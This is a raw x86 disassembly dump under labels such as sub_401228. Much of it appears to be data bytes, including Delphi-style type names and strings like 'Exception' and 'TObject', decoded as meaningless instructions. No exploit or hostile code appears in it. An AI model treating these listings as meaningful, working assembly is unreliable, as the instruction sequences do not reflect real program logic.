sub_401228
adc al [ eax ]
add eax 0x736c6146
add al 0x54
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
add al [ eax ]
mov eax 0xe004012
add eax 0x49554754
push es
push ebx
jns r-xdata
add al [ eax ]
pushfd
jb r-xdata
cmp bh 0xff
je r-xdata
je r-xdata
inc edi
je r-xdata
adc [ eax ] al
sbb [ eax ] al
popad
arpl [ ebp + 0x45 ] sp
outsb
je r-xdata
pop es
dec eax
push edx
inc ebp
push ebx
push ebp
dec esp
push esp
add al 0x0
add [ eax ] al
insd
add al [ eax ]
nop
inc esp
adc al [ eax ]
adc al [ esi ]
jae r-xdata
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
imul esp [ ebp + 0x73 ] 0x20002
lea eax [ eax ]
add al 0x14
inc eax
add [ esi ] cl
jb r-xdata
add al [ eax ]
add al [ eax ]
mov eax eax
jns r-xdata
inc esp
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
clc
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ edx ]
inc esp
push ebp
dec ecx
jb sub_4012b3
add [ eax - 0x2fffbfa8 ] dh
outsd
or [ fs : eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add [ eax ] al
push eax
dec ecx
outsb
je r-xdata
add [ ebx + 0x401398c0 ] cl
add [ edx ] al
pop es
push esp
push cs
jb r-xdata
add al 0x0
add [ eax ] al
mov ah 0x12
inc eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
add ecx [ ecx + 0x49 ]
inc esp
add al [ eax ]
in al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
add [ edx ] al
push es
adc eax [ eax ]
add al [ eax ]
nop
sub [ ebx ] dl
inc eax
add [ esi ] cl
andps xmm1 [ ecx + 0x6e ]
je r-xdata
outsb
add al [ bx + si ]
mov eax eax
push esp
adc al [ eax ]
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
add al [ bx + si ]
mov eax eax
push 0xa004012
or al [ ecx + 0x6e ]
jae r-xdata
adc eax r-xdata
hlt
add al [ eax ]
add al [ eax ]
xchg esp eax
adc al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx ] al
inc eax
add [ eax ] al
add [ eax ] al
dec ebp
je r-xdata
popad
arpl [ ebp + 0x54 ] sp
popad
bound ebp [ ebp - 0x50 ]
inc ebp
outsb
je r-xdata
je r-xdata
cwde
adc eax [ eax ]
adc al 0xf
jb r-xdata
xor [ edx ] eax
add ah cl
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ edx ]
inc esp
xor al [ edx ]
push ebx
je r-xdata
add [ eax ] al
add al [ ebx + eax * 2 ]
jb r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ edi ] bl
add [ eax + 0x44004015 ] bl
add ah dh
add [ eax ] al
xchg esp eax
adc al 0x40
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004015 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
jns r-xdata
add [ eax ] al
add cl [ edx ]
dec ecx
insd
jo r-xdata
add [ eax + edx + 0x180040 ] bl
add [ edi + ecx ] dl
popad
arpl [ ebp + 0x45 ] sp
outsb
je r-xdata
add ah cl
adc [ eax ] al
push es
add al [ edx + esi + 0x2 ]
imul ebp [ esi + 0x67 ] 0x20000
jl r-xdata
outsd
add al [ gs : eax ]
in al 0x10
inc eax
add [ eax + eax ] al
add [ eax ] al
add al [ esp + eax * 2 ]
popad
je r-xdata
add al 0x43
popad
arpl [ ebp + 0x54 ] sp
popad
bound ebp [ ebp - 0x3c ]
inc ebp
add al 0x0
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add cl [ edx ]
outsd
jne r-xdata
adc eax [ eax ]
add al [ eax ]
nop
mov ah 0x13
inc eax
add [ esi ] cl
andps xmm1 [ ecx + 0x6e ]
je r-xdata
jns r-xdata
adc eax [ esi ]
inc eax
add [ edi + eax ] cl
push esi
popad
jb r-xdata
add [ esp + edx + 0x40 ] dl
add [ eax ] al
nop
adc eax 0x80040
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push esi
push esp
popad
bound ebp [ ebp + 0x2 ]
add [ eax + edx + 0x140040 ] bl
add [ eax ] al
add al [ edi ]
dec ecx
dec edi
jae r-xdata
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx ] dl
push eax
dec ecx
outsb
je r-xdata
ror [ ebx + edx ] 0x40
add [ eax + eax * 2 ] bl
add [ edx ] al
add [ ebx + 0x4012a0c0 ] cl
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add al [ ebx + esi + 0x2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ edx ] al
add al [ esp + esi + 0x2 ]
add [ edx ] al
add [ ebx + 0x40130cc0 ] cl
add [ esi ] al
popad
outsb
je r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add al [ edi ]
inc ebp
outsb
add [ eax ] al
push esp
inc ebx
insb
popad
jae r-xdata
mov [ edx ] ss
inc eax
add [ ebx ] dl
push es
add [ eax + r-xdata ] dl
sub_4012b3
add [ eax + 0xe004012 ] bh
add eax 0x49554754
inc esp
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
clc
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ edx ]
inc esp
xor [ edx ] eax
add ah cl
adc [ eax ] al
add al 0x0
add [ eax ] al
add al [ edx ]
inc esp
xor al [ edx ]
add ah cl
adc [ eax ] al
push es
add [ eax ] al
add [ edx ] al
add al [ ebx + esi + 0x2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ edx ] al
add al [ esp + esi + 0x2 ]
add [ edx ] al
add [ ebx + 0x40130cc0 ] cl
add [ edi + ecx ] dl
push eax
dec ecx
outsb
je r-xdata
add al [ eax ]
pushfd
jb r-xdata
je r-xdata
inc edi
je r-xdata
adc [ eax ] al
sbb [ eax ] al
popad
arpl [ ebp + 0x45 ] sp
outsb
je r-xdata
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
imul esp [ ebp + 0x73 ] 0x20002
lea eax [ eax ]
add al 0x14
inc eax
add [ esi ] cl
jb r-xdata
add al [ eax ]
add al [ eax ]
mov eax eax
jns r-xdata
add [ eax - 0x2fffbfa8 ] dh
outsd
or [ fs : eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add [ eax ] al
push eax
dec ecx
outsb
je r-xdata
add [ ebx + 0x401398c0 ] cl
add [ edx ] al
pop es
push esp
push cs
jb r-xdata
add al 0x0
add [ eax ] al
mov ah 0x12
inc eax
add [ eax ] al
add [ eax ] al
add [ edx ] al
add ecx [ ecx + 0x49 ]
inc esp
add al [ eax ]
in al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
add [ edx ] al
push es
adc eax [ eax ]
add al [ eax ]
nop
sub [ ebx ] dl
inc eax
add [ esi ] cl
andps xmm1 [ ecx + 0x6e ]
je r-xdata
adc eax r-xdata
hlt
add al [ eax ]
add al [ eax ]
xchg esp eax
adc al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx ] al
inc eax
add [ eax ] al
add [ eax ] al
dec ebp
je r-xdata
popad
arpl [ ebp + 0x54 ] sp
popad
bound ebp [ ebp - 0x50 ]
inc ebp
outsb
je r-xdata
je r-xdata
cwde
adc eax [ eax ]
adc al 0xf
jb r-xdata
add [ eax ] al
add al [ ebx + eax * 2 ]
jb r-xdata
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ edi ] bl
add [ eax + 0x44004015 ] bl
add ah dh
add [ eax ] al
xchg esp eax
adc al 0x40
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004015 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
jns r-xdata
add [ eax ] al
add cl [ edx ]
dec ecx
insd
jo r-xdata
add [ eax + edx + 0x180040 ] bl
add [ edi + ecx ] dl
popad
arpl [ ebp + 0x45 ] sp
outsb
je r-xdata
outsd
add al [ gs : eax ]
in al 0x10
inc eax
add [ eax + eax ] al
add [ eax ] al
add al [ esp + eax * 2 ]
popad
je r-xdata
add al 0x43
popad
arpl [ ebp + 0x54 ] sp
popad
bound ebp [ ebp - 0x3c ]
inc ebp
add al 0x0
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] bl
add [ eax ] al
add cl [ edx ]
outsd
jne r-xdata
adc eax [ eax ]
add al [ eax ]
nop
mov ah 0x13
inc eax
add [ esi ] cl
andps xmm1 [ ecx + 0x6e ]
je r-xdata
jns r-xdata
add [ esp + edx + 0x40 ] dl
add [ eax ] al
nop
adc eax 0x80040
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
push esi
push esp
popad
bound ebp [ ebp + 0x2 ]
add [ eax + edx + 0x140040 ] bl
add [ eax ] al
add al [ edi ]
dec ecx
dec edi
jae r-xdata
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add al [ edi ]
inc ebp
outsb
add [ eax ] al
sub_4015c1
push ebp
inc eax
add [ esi + eax * 2 ] al
jb r-xdata
jo r-xdata
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
add ah bh
push ebp
inc eax
add [ ecx + ecx * 2 ] cl
outsb
imul esi [ ecx + ecx * 2 + 0x6e ] 0x6e617473
arpl [ ebp + 0x3 ] sp
add [ eax ] al
sbb al 0x40
add [ eax ] cl
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah ah
adc [ eax ] al
add [ eax ] eax
or [ ecx + 0x6e ] cl
jae r-xdata
xor al 0x0
enter 0x4054 0x0
or [ ebx + 0x6c ] eax
popad
jae r-xdata
outsb
jae r-xdata
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ edx ] al
add [ edi ] ch
add [ esi + edx * 2 + 0x40 ] dl
add [ edi ] cl
inc ebx
insb
popad
outsb
jne r-xdata
add eax [ eax ]
mov [ edx ] dl
insb
add al [ eax ]
inc eax
inc eax
dec esi
popad
insd
add eax [ gs : eax ]
inc eax
adc al [ eax ]
or [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x53
add [ ecx ] eax
add al [ eax ]
add al [ eax ]
cmp [ eax ] eax
loopne r-xdata
popad
outsb
arpl [ ebp + 0x3 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] eax
rcl [ eax + eax * 2 ] 0x9
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] eax
test al 0x58
inc eax
add [ ecx ] cl
inc ebx
insb
popad
jae r-xdata
inc eax
add [ ebx ] cl
inc ebx
insb
popad
jae r-xdata
adc al [ eax ]
add [ eax ] eax
add [ eax + 0x40 ] al
dec ecx
add [ eax + 0x1004012 ] cl
add [ esi ] al
inc ecx
inc ebx
insb
popad
jae r-xdata
dec ecx
outsb
outsw
add eax [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
add al 0x53
push esp
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub al 0x0
mov eax 0xc004055
dec ecx
dec esi
popad
insd
dec ecx
jae r-xdata
popad
insd
add al [ gs : eax ]
add al [ eax ]
inc esi
add al [ eax ]
add al [ eax ]
cmp eax [ eax ]
mov [ ecx + 0x40 ] ds
add [ 0x6874654d ] cl
outsd
inc ecx
jb r-xdata
adc [ eax ] al
popad
outsb
arpl [ ebp + 0x53 ] sp
imul edi [ edx + 0x65 ] 0x109c0003
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
outsb
jae r-xdata
add [ ecx + ecx * 2 ] cl
inc eax
add [ ebx ] cl
inc ebx
insb
popad
jae r-xdata
add eax [ gs : eax ]
mov [ edx ] dl
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
popad
insd
add al [ gs : eax ]
add al [ eax ]
sub eax [ eax ]
jl r-xdata
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
outsd
dec esi
popad
insd
add eax [ gs : eax ]
add [ edx + ebx * 2 ] ah
inc eax
add [ edx ] cl
dec ebp
je r-xdata
jae r-xdata
inc eax
add [ edx ] al
add [ ecx ] al
add [ edx ] eax
add [ edx ] al
add [ edx ] bh
add [ eax + 0x5a ] dh
jae r-xdata
or [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x53
jb r-xdata
xchg esp eax
pop eax
inc eax
add [ ecx + ecx * 2 ] cl
outsb
push 0x74697265
jae r-xdata
add [ eax + eax ] bh
push eax
popad
jb r-xdata
add al [ eax ]
add ecx [ edi + 0x62 ]
push 0x2
jae r-xdata
add [ edx ] al
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ ebx + edx * 2 ] al
jae r-xdata
inc eax
adc al [ eax ]
or [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x53
insb
add al [ eax ]
add ah ah
adc [ eax ] al
add [ eax ] eax
pop es
inc ecx
jb r-xdata
add eax [ eax ]
insb
add al [ eax ]
add [ ecx + edx + 0x10040 ] ebx
add al 0x4e
popad
insd
add al [ gs : eax ]
add al [ eax ]
cmp eax [ eax ]
cld
pop ecx
inc eax
add [ 0x6874654d ] cl
outsd
inc ecx
jb r-xdata
add eax [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
inc edi
je r-xdata
mov eax 0xc004056
jae r-xdata
imul esp [ ebp + 0x6c ] 0x64644164
jb r-xdata
or al 0x46
add eax [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
push 0x6441646f
jb r-xdata
insd
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
insb
add al [ eax ]
add al [ eax ]
cmp al 0x0
add [ eax ] al
add al 0x53
outsb
je r-xdata
insb
add eax [ gs : eax ]
xchg esp eax
adc eax [ eax ]
or [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x53
insb
add al [ eax ]
add al [ eax ]
xor eax [ eax ]
aam 0x57
outsb
je r-xdata
adc [ edi + 0x65 ] eax
je r-xdata
add eax [ eax ]
in al 0x10
inc eax
add [ eax ] cl
jb r-xdata
outsb
je r-xdata
add [ eax + 0x12 ] al
inc eax
add [ ecx ] al
add [ esi + ecx * 2 ] al
popad
insd
add al [ gs : eax ]
add al [ eax ]
inc esi
add [ eax + 0xc004056 ] bh
add al [ eax ]
inc eax
inc eax
adc al [ eax ]
add al [ eax ]
add [ ecx ] eax
add al [ eax ]
add al [ eax ]
cmp al [ eax ]
jo r-xdata
add [ edx ] al
add [ esi ] bh
add [ eax + 0x11004057 ] cl
inc edi
je r-xdata
add eax [ gs : eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ ebx ] al
add [ eax ] al
sbb al 0x40
popad
insd
add al [ gs : eax ]
add al [ eax ]
cmp al [ eax ]
in al 0x5a
inc eax
add [ esi + eax * 2 ] cl
imul esp [ ebp + 0x6c ] 0x64644164
jb r-xdata
add eax [ eax ]
in al 0x10
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ ecx + edx + 0x10040 ] ebx
add al 0x4e
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8004012 ] cl
insb
add al [ eax ]
inc eax
inc eax
popad
insb
jae r-xdata
inc eax
add [ eax ] cl
push ebp
outsb
imul esi [ esi + ecx * 2 + 0x61 ] 0x3656d
inc eax
adc al [ eax ]
or [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x53
popad
arpl [ ebp + 0x45 ] sp
outsb
je r-xdata
add al [ eax ]
jb r-xdata
insb
add al [ eax ]
push ebx
inc eax
add [ esi + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
xor [ eax ] eax
aam 0x58
jo r-xdata
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ ebx ] al
dec edi
bound ebp [ edx + 0x2 ]
add [ edx ] al
add [ ebx ] ch
add [ esi + edx * 2 + 0x470b0040 ] dh
je r-xdata
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add al [ eax ]
add [ eax + eax * 2 ] bl
insb
add al [ eax ]
inc eax
inc eax
adc al [ eax ]
add [ eax ] eax
add [ ecx ] eax
add al [ eax ]
add al [ eax ]
xor eax [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi ] al
inc ebp
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
jns r-xdata
inc esp
add al [ eax ]
add al [ eax ]
xor [ eax ] eax
int3
mov ah 0x12
inc eax
add [ ecx ] al
add [ ebx ] al
dec ecx
dec ecx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ edx + edx + 0x10040 ] esi
add ecx [ ecx + 0x49 ]
inc esp
add al [ eax ]
and [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ ebx ] al
dec edi
bound ebp [ edx + 0x2 ]
popad
arpl [ ebp + 0x3 ] sp
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add eax [ eax ]
add [ eax + eax * 2 ] bl
popa
jne r-xdata
inc esp
jae r-xdata
inc eax
add [ ecx ] dl
inc edx
outsw
add [ edx ] al
add [ ecx ] dh
imul ebp [ edi + 0x6e ] 0x129c0003
inc eax
add [ eax ] cl
add [ ebx ] al
add [ eax ] al
sbb al 0x40
adc al [ eax ]
add [ eax ] eax
add [ ecx ] eax
add al [ eax ]
add al [ eax ]
pop ebx
add [ eax + 0x11004058 ] dh
push ebx
popad
inc bx
popad
insb
insb
inc ebp
js r-xdata
popad
jae r-xdata
add [ edx + edx + 0x10040 ] esi
add ecx [ ecx + 0x49 ]
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] cl
adc eax [ eax ]
or [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x53
popad
outsb
arpl [ ebp + 0x3 ] sp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
daa
je r-xdata
or [ eax ] al
add al [ eax ]
add [ eax + eax * 2 ] bl
jb r-xdata
add ah dl
pop eax
bound ebp [ edx + 0x65 ]
arpl [ edx + eax ] si
add ah ah
adc [ eax ] al
add al [ eax ]
or al [ ebp + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add [ eax * 2 + 0x70656378 ] cl
je r-xdata
add eax [ eax ]
pushfd
adc al [ eax ]
or [ eax ] al
add eax [ eax ]
add [ eax + eax * 2 ] bl
inc ebx
outsd
add eax [ gs : eax ]
pushfd
adc [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
xor eax [ eax ]
mov eax 0x8004058
push esp
outsd
push ebx
je r-xdata
add [ ebx + 0x4483ccc0 ] cl
and al 0x4
clc
jmp sub_409d60
jb r-xdata
or [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x53
popad
outsb
insb
jb r-xdata
add [ ecx ] al
add [ eax ] al
sbb al 0x40
popad
add al [ gs : bx + si ]
add al [ eax ]
sub eax [ eax ]
mov [ ebp + 0x40 ] dl
add [ ebx ] cl
dec esi
ja r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ edi ] al
add [ eax ] al
sbb al 0x40
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ eax + eax * 2 ] bl
jb r-xdata
outsw
jb r-xdata
add [ edx ] cl
inc ebp
js r-xdata
imul ebp [ esi + 0x67 ] 0x12400003
inc eax
add [ eax ] cl
add [ edx ] al
add [ eax ] al
sbb al 0x40
add [ eax ] al
add [ ebx + edx * 2 ] al
jns r-xdata
jns r-xdata
dec ecx
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ eax ] al
rol [ eax ] 0x0
je r-xdata
add al ah
push ebp
inc eax
add [ edi ] al
inc esp
jae r-xdata
add [ edx ] al
add [ edi ] ah
outsb
jae r-xdata
movsb [ edi ] [ esi ]
push ebp
inc eax
add [ esi + eax * 2 ] cl
jb r-xdata
popad
add al [ gs : bx + si ]
add al [ eax ]
aas
add ah cl
pop eax
inc eax
add [ esi ] cl
inc esp
add [ ecx ] dh
add al dl
pop eax
inc eax
add [ ecx ] dl
inc ecx
je r-xdata
add [ edx ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
cmp [ eax ] eax
fcomp [ eax + 0x40 ]
add [ eax ] cl
inc esp
imul esi [ ebx + 0x70 ] 0x68637461
add eax [ eax ]
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
add al 0x1c
inc eax
add [ eax ] al
or [ eax ] al
add [ eax ] eax
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
je r-xdata
inc eax
add ah bh
sbb al 0x40
add [ ecx ] bl
sbb eax 0x40
inc eax
add [ eax ] al
add [ eax ] al
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
insd
add [ eax ] al
add [ eax ] al
add al [ eax ]
sub [ eax + eax * 2 ] bl
add [ edi ] cl
or cl [ ecx + 0x49 ]
outsb
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx * 4 + 0x14 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
sbb al 0x40
insb
add al [ eax ]
add al [ eax ]
sub al 0x0
popad
outsb
arpl [ ebp + 0x3 ] sp
add [ eax ] al
sbb al 0x40
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
push 0x3
jb r-xdata
jo r-xdata
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sbb al 0x40
add [ esp + ebx + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x78 ] al
sbb al 0x40
jb r-xdata
inc esp
jae r-xdata
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
sbb al 0x40
outsd
outsb
jae r-xdata
dec ebp
jae r-xdata
je r-xdata
inc esi
js r-xdata
popad
arpl [ ebp ] sp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push es
push ebx
jns r-xdata
add [ ecx ] al
add [ edx ] al
or [ esi ] ebx
jb r-xdata
add [ ebx ] al
add [ edi + 0x1d ] al
inc eax
add [ edx ] cl
stc
add [ eax ] al
add al [ eax ]
jb r-xdata
add [ eax ] al
xor eax 0x1000401d
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add [ ebx * 4 - 0x62bfffc0 ] dh
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x63 ] dl
inc eax
add [ ebp + edx * 2 + 0x55e00040 ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ ecx ] al
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
or [ esi + 0x52 ] eax
inc bx
outsd
jne r-xdata
add [ eax ] al
je r-xdata
inc eax
add [ edx ] al
add [ edx ] al
add [ eax + edx + 0x40040 ] bl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add cl [ ecx ]
push ds
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
aam 0x1d
inc eax
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub eax [ eax ]
push eax
popfd
inc eax
add [ ebx ] cl
dec esi
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ edi ] al
dec ebp
jae r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add eax [ eax ]
fcomp [ 0x1cfc0040 ]
inc eax
insd
add eax [ eax ]
outsb
jae r-xdata
je r-xdata
popad
outsb
arpl [ ebp + 0x3 ] sp
add [ eax ] al
sbb al 0x40
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
fcomp [ 0x11070040 ]
push esp
dec ecx
outsb
je r-xdata
or [ esp + eax * 2 + 0x61 ] edx
push ds
inc eax
add [ esp + ecx ] dl
push eax
push ebx
push 0x5374726f
je r-xdata
je r-xdata
dec eax
push ds
inc eax
jb r-xdata
jb r-xdata
push esp
imul ebp [ ebp + 0x65 ] 0x8b000201
shl [ eax + 0x1e ] 0x40
add cl [ eax ]
dec esp
outsd
ja r-xdata
imul ebp [ esi + 0x67 ] r-xdata
add al [ eax ]
add [ eax + ecx ] dl
push eax
dec esp
outsd
outsb
imul ebp [ bp + 0x74 ] r-xdata
add al [ eax ]
pop esp
push ds
inc eax
add [ ecx + ecx ] al
push esp
